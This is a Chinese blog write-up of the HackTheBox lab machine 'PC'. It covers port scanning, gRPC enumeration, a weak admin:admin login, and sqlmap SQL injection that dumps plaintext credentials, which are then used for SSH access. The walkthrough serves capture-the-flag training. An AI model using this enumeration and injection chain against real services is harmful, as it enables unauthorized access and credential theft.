---
title: HTB-PC通关记录
date: 2023-07-10 01:17:11
tags:
  - HackTheBox
  - PC
  - WriteUp
keywords: HackTheBox
categories: WriteUp
description: 本文记录了作者在通关 HackTheBox 靶机 PC 中遇到的问题以及踩坑后的解决方案。涉及 gRPC 服务探测，sqlmap注入获取立足点。
top_img: https://pic.imgdb.cn/item/64aaeb061ddac507cc460e7c.jpg
cover: https://pic.imgdb.cn/item/64aaeb061ddac507cc460e7c.jpg
---

## 靶机描述

靶机 IP :  10.10.11.214

## 信息收集

### nmap扫描

按照常规的方法：使用Nmap对靶机进行扫描，通过 TCP | UDP 扫描端口、获取开放端口对应信息、系统版本信息。

下面是通过 TCP 、UDP 扫描发现的开放端口信息：

```
$ sudo nmap -Pn -sT -p- --min-rate 10000 10.10.11.214 -oN nmapscan/portscan.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-07 17:19 CST
Nmap scan report for 10.10.11.214
Host is up (0.37s latency).
PORT      STATE SERVICE
22/tcp    open  ssh
50051/tcp open  unknown
Nmap done: 1 IP address (1 host up) scanned in 84.48 seconds

$ sudo nmap -Pn -sU -p- --min-rate 10000 10.10.11.214 -oN nmapscan/uportscan.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-07 17:21 CST
Nmap scan report for 10.10.11.214
Host is up (0.40s latency).
Not shown: 65534 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
50051/udp closed unknown
Nmap done: 1 IP address (1 host up) scanned in 16.39 seconds

$ sudo nmap -Pn -sT -sCV -O -p22,50051 --min-rate 10000 10.10.11.214 -oN nmapscan/servscan.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-07 17:29 CST
Nmap scan report for 10.10.11.214
Host is up (0.63s latency).
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
50051/tcp open  unknown
Aggressive OS guesses: Linux 4.15 - 5.6 (92%), Linux 5.0 (92%), Linux 5.0 - 5.4 (91%), Linux 5.3 - 5.4 (91%), Linux 2.6.32 (91%), Linux 5.0 - 5.3 (90%), Crestron XPanel control system (90%), Linux 5.4 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%)        No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

分析 Nmap 的扫描结果，可以知道目标机器打开了22端口（ ssh 服务）和50051端口（服务未知）。

通过 Google 和 Github 搜索，查询到 50051 端口是 gRPC 服务的默认端口<sup>[①](#gRPC-服务)</sup>。

### gRPC 服务探测

进一步查找相关工具，发现有两个开源工具能够连接gRPC服务：`grpcurl` （命令行）和 `grpcui` （界面）<sup>[②](#go-install-存在的问题)</sup>。

``` bash
# install grpcurl
go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest
# install grpcurl
go install github.com/fullstorydev/grpcui/cmd/grpcui@latest
```

使用二者都可以对50051端口进行访问。

首先使用 `grpcurl` 工具访问靶机 50051 端口<sup>[③](#grpcurl-工具使用)</sup>：

1. 使用 `-plaintext` 加密方式，使用 `list` 参数查看 gRPC 服务——只存在一个自定义服务 `SimpleApp` ，它很明显是目标服务。
2. 继续追踪 `SimpleApp` 服务存在哪些方法和详细请求方法（ `request` ），使用 `-plaintext` 加密方式和 `describe` 参数，发现该服务存在三个方法 `LoginUser` ， `RegisterUser` ， `getInfo` ，以及对应的请求方法 `.LoginUserRequest ` ，`.RegisterUserRequest` ，`.getInfoRequest` 。
3. 分别使用 `describe` 参数查看请求方法 `.LoginUserRequest ` ，`.RegisterUserRequest` ，`.getInfoRequest` 所需的请求参数。

```
# list the gRPC sercice name
$ grpcurl -plaintext 10.10.11.214:50051 list
SimpleApp
grpc.reflection.v1alpha.ServerReflection

# decribe the methods of the service SimpleApp
$ grpcurl -plaintext 10.10.11.214:50051 describe SimpleApp
SimpleApp is a service:
service SimpleApp {
  rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );
  rpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );
  rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );
}

$ grpcurl -plaintext 10.10.11.214:50051 describe .RegisterUserRequest
RegisterUserRequest is a message:
message RegisterUserRequest {
  string username = 1;
  string password = 2;
}

$ grpcurl -plaintext 10.10.11.214:50051 describe .LoginUserRequest
LoginUserRequest is a message:
message LoginUserRequest {
  string username = 1;
  string password = 2;
}

$ grpcurl -plaintext 10.10.11.214:50051 describe .getInfoRequest
getInfoRequest is a message:
message getInfoRequest {
  string id = 1;
}
```

根据上文所获取的信息，试试直接用 `admin:admin` 弱口令登录，没想到一下就成功了。返回了 `id` 参数和一个 JWT 的 `token` 值<sup>[④](#grpcurl-工具使用)</sup>。

```
$ grpcurl -vv -d '{"username":"admin","password":"admin"}' -plaintext 10.10.11.214:50051 SimpleApp.LoginUser

Resolved method descriptor:
rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );

Request metadata to send:
(empty)

Response headers received:
content-type: application/grpc
grpc-accept-encoding: identity, deflate, gzip

Estimated response size: 16 bytes

Response contents:
{
  "message": "Your id is 33."
}

Response trailers received:
token: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODcxMTkxMzV9.kZacDAWwQJFdTb420SmvGJjerGN_qElGIqxc5Djx9SU'
Sent 1 request and received 1 response
```

JWT 解密如下<sup>[⑤](#JWT-定义)</sup>：

```
token:b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODc4NDY0NDN9.12U74eYXtA48KQwH7RIygyxEQ850zsBXgoWNsnbNLuw'
=======================================================

{
    "payload": {
        "user_id": "admin",
        "exp": 1687846443
    }
}
```

没有发现可用信息，因此在这卡住了。于是我又去找了图形化界面 `grpcui` 试试，然后发现结果相差不多。

```
$ grpcui -plaintext  10.10.11.214:50051
gRPC Web UI available at http://127.0.0.1:34417/
```

## sql 注入获取立足点

峰回路转，某次输错 `id` 参数的时候发现了报错信息，猛然意识到这里会不会存在注入？于是试图抓一下 request 包交由 sqlmap 一下。但是在抓本地的包又踩到一个意料之外的坑，详情请见下文的注释，这里就不深入展开了<sup>[⑥](#Burp与SwitchOmega-如何抓本地包)</sup>。

![意外发现抱错](https://pic.imgdb.cn/item/64aa852a1ddac507cc5f7b01.png)

我将抓到的 request 包保存为 `id.req` 文件保存，然后使用 `*` 标记 `id` 参数<sup>[⑦](#sqlmap-自定义注入标记)</sup>。
在确认存在 sql 注入之后，直接使用 `--dump` 参数获取账号密码，最终取得靶机的基础立足点。

```
$ sqlmap -r id.req --dbms=sqlite --batch
---
Parameter: JSON #1* ((custom) POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODc4NDY0NDN9.12U74eYXtA48KQwH7RIy
gyxEQ850zsBXgoWNsnbNLuw"}],"data":[{"id":"769 UNION ALL SELECT CHAR(113,120,118,107,113)||CHAR(100,77,102,114,78,99,111,113,116,70,113,90,79,68,104,80,115,71
,77,117,78,108,114,109,105,120,97,100,117,99,72,99,72,83,115,104,70,65,86,90)||CHAR(113,122,112,106,113)-- Klui"}]}
---

$ sqlmap -r id.req --dump --batch

Database: <current>
Table: accounts
[2 entries]
+------------------------+----------+
| password               | username |
+------------------------+----------+
| admin                  | admin    |
| HereIsYourPassWord1431 | sau      |
+------------------------+----------+
```

通过 `ssh` 直接登录 `sau` 用户。

```
$ ssh sau@pc.htb
# HereIsYourPassWord1431
sau@pc:~$ uname
Linux
sau@pc:~$ uname -a
Linux pc 5.4.0-148-generic #165-Ubuntu SMP Tue Apr 18 08:53:12 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
sau@pc:~$ id
uid=1001(sau) gid=1001(sau) groups=1001(sau)
sau@pc:~$ sudo -l
[sudo] password for sau: 
Sorry, user sau may not run sudo on localhost.
sau@pc:~$ whoami
sau
sau@pc:~$ 
```

## 注释

### hosts 文件修改

`/etc/hosts` 文件是一个用于映射 IP 地址和主机名的本地配置文件。它可以用来在本地系统中手动指定IP地址和主机名的对应关系，从而绕过 DNS 服务器进行主机名解析——在系统进行 DNS 解析之前，会首先去 `hosts` 文件中查找。在 `hosts` 文件中，如果能够找到被访问域名的 IP 地址，就不会再向 DNS 服务器发起请求。

该文件的格式如下：

```
# IP hosts_name Alias
# example
127.0.0.1	localhost
127.0.1.1	K4.	K4
```

每一行表示一个IP地址和主机名的对应关系。IP地址和主机名之间用空格或制表符分隔，可以有多个别名，多个别名之间也用空格或制表符分隔。以 `#` 开头的行表示注释，将被系统忽略。

hosts文件的作用是在本地系统中进行主机名解析，当系统需要解析一个主机名时，会首先查找hosts文件中是否有对应的IP地址。如果有，则直接使用该IP地址；如果没有，则会继续使用DNS服务器进行解析。

| 系统 | hosts文件位置 |
|:--|:--|
| Linux 系统 | `/etc/hosts`  |
| Windows 系统 | `C:\Windows\System32\drivers\etc\hosts` |

### gRPC 服务

>**Why gRPC?**
>
>gRPC is a modern open source high performance Remote Procedure Call (RPC) framework that can run in any environment. It can efficiently connect services in and across data centers with pluggable support for load balancing, tracing, health checking and authentication. It is also applicable in last mile of distributed computing to connect devices, mobile applications and browsers to backend services.

[gRPC](https://grpc.io/)是 Google Remote Procedure Call 。gRPC 是一个开源的 RPC 框架，用于创建可扩展和快速的 API 。它使网络系统的开发以及 gRPC 客户端和服务器应用程序之间的开放通信成为可能。gRPC 已经被一些顶级科技公司所接受，包括谷歌、IBM 、Netflix 等等。gRPC 框架依赖于 HTTP/2 、协议缓冲区等尖端技术栈，以实现最佳的 API 保护、高性能远程过程调用和可扩展性。

### go install 存在的问题

#### 代理问题

因为审查的原因，go 无法直接安装，因此使用 [goproxy](https://github.com/goproxy/goproxy.cn)安装 go 的相关模块。

在终端中直接执行下方的命令

```
go env -w GO111MODULE=on
go env -w GOPROXY=https://goproxy.cn,direct
```

#### 环境变量问题

因为作者实在 WSL 中运行的 go ，所以还需要配置对应的 go 的环境变量。正确的配置如下：

```
# set go PATH
export GOROOT=/usr/local/go
export GOPATH=/home/kali/go
export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
```

注意，`$PATH` 应该放在后方而不是前方，不然在 WSL 环境下会报错。这是因为 WSL 的环境变量还包括了 Windows 的环境变量。

### grpcurl 工具使用

安装好 `grpcurl` 后，使用 `-h` 参数，可以看到相关说明如下：

```
$ grpcurl -h
Usage:

grpcurl [flags] [address] [list|describe] [symbol]

The 'address' is only optional when used with 'list' or 'describe' and a
protoset or proto flag is provided.

If 'list' is indicated, the symbol (if present) should be a fully-qualified
service name. If present, all methods of that service are listed. If not
present, all exposed services are listed, or all services defined in protosets.

If 'describe' is indicated, the descriptor for the given symbol is shown. The
symbol should be a fully-qualified service, enum, or message name. If no symbol
is given then the descriptors for all exposed or known services are shown.

If neither verb is present, the symbol must be a fully-qualified method name in
'service/method' or 'service.method' format. In this case, the request body will
be used to invoke the named method. If no body is given but one is required
(i.e. the method is unary or server-streaming), an empty instance of the
method's request type will be sent.

The address will typically be in the form "host:port" where host can be an IP
address or a hostname and port is a numeric port or service name. If an IPv6
address is given, it must be surrounded by brackets, like "[2001:db8::1]". For
Unix variants, if a -unix=true flag is present, then the address must be the
path to the domain socket.
```

### JWT 定义

#### 用户认证机制

一般用户认证机制：

1. 用户向服务器发送用户名和密码。

2. 服务器验证通过后，在当前对话（session）里面保存相关数据，比如用户角色、登录时间等等。

3. 服务器向用户返回一个 `session_id` ，写入用户的 Cookie。

4. 用户随后的每一次请求，都会通过 Cookie，将 `session_id` 传回服务器。

5. 服务器收到 `session_id` ，找到前期保存的数据，由此得知用户的身份。

#### JWT 认证机制

JWT（JSON Web Token）是一种用于在网络上进行安全传输的开放标准（RFC 7519）。它是一种基于 JSON 的令牌，用于在客户端和服务器之间传递声明。JWT 通常用于身份验证和授权，可以帮助在不同的系统之间安全地传输信息。

JWT由三部分组成：头部（Header）、载荷（Payload）和签名（Signature）。头部包含描述JWT的元数据，例如算法和令牌类型。载荷包含要传输的声明，例如用户ID、角色等。签名用于验证JWT的真实性。

![JWT结构](https://pic.imgdb.cn/item/64a99caa1ddac507cceedda2.jpg)

JWT的工作流程如下：

1. 用户通过用户名和密码进行身份验证。
2. 服务器验证用户的身份，并生成一个 JWT 。
3. 服务器将 JWT 发送给客户端。
4. 客户端将 JWT 保存在本地，例如在浏览器的本地存储或Cookie中。
5. 客户端在每次请求时将 JWT 作为 `Authorization` 头部的 `Bearer` 令牌发送给服务器。
6. 服务器验证 JWT 的签名，并根据其中的声明进行授权。

客户端收到服务器返回的 JWT，可以储存在 Cookie 里面，也可以储存在 localStorage。

此后，客户端每次与服务器通信，都要带上这个 JWT。你可以把它放在 Cookie 里面自动发送，但是这样不能跨域，所以更好的做法是放在 HTTP 请求的头信息 `Authorization` 字段里面。

 ```javascript
 Authorization: Bearer <token>
 ```

另一种做法是，跨域的时候，JWT 就放在 POST 请求的数据体里面。

### Burp与SwitchOmega 如何抓本地包

抓取发回到本地包出现了问题：无法抓取到发向本地包。

我使用的环境为：`Chrome` + `SwitchOmega` ，以往使用 `phpstudy` 时抓取本地包我都是直接访问本地 IP 地址，而非 `127.0.0.1` 或者 `localhost` 。但此次踩坑情况与以往并不相同，拓扑图如下：

![本地包抓取](https://pic.imgdb.cn/item/64aa98401ddac507cc8a193c.jpg)

最终翻看 Google 和 StackOverflow 后，找到了一个解决方法：[Burp Interception does not work for localhost in Chrome](https://stackoverflow.com/questions/55616614/burp-interception-does-not-work-for-localhost-in-chrome)，即删掉本地代理的过滤：

```
# remove the filtering on the local proxy
127.0.0.1
::1
localhost
# change the settings to loopback
<-loopback>
```

这是因为——[待填坑]

在Windows中设置代理不过滤选项为"<-loopback>"的意义是为了防止本地回环（loopback）地址被代理过滤。本地回环地址是指网络上的特殊IP地址，即127.0.0.1，用于在同一台计算机上进行内部通信。

当设置代理不过滤选项为"<-loopback>"时，代理服务器将不会对本地回环地址进行代理过滤。这意味着在使用代理的情况下，您仍然可以通过本地回环地址进行本地网络通信，而无需经过代理服务器。

### sqlmap 自定义注入标记

在 sqlmap 中，自定义注入标记（Custom Injection Marker）是一个用于标记注入点的字符串，sqlmap 将会通过查找该字符串来确定注入点的位置。默认情况下，sqlmap使用 `*` 作为自定义注入标记。

例如，`http://example.com/vuln.php?id=1` 的注入点在 `id` 处，将URL修改为 `http://example.com/vuln.php?id=*` ， sqlmap 就会自动识别注入点了。

如果目标URL中包含 `*` 字符，需要将其转义为 `\*` 。
